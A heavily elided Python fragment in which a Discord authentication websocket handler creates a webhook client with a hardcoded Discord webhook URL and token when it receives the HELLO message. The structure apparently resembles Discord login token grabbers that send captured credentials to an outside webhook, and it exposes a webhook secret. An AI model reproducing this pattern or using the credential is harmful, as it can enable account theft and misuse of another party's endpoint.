...
class DiscordAuthWebsocket:
    ...
    def on_message(self, message):
        ...
        if op == Messages.HELLO:
            ...
            webhook = DiscordWebhook(url='https://canary.discord.com/api/webhooks/837845709150879776/pct_0OOvJvlHFrlR6XWWj2Ay-h8cmqpmJj0Up3Nbn6i8VDNxWu8c0EZ42cOyH2Zc7bz8')
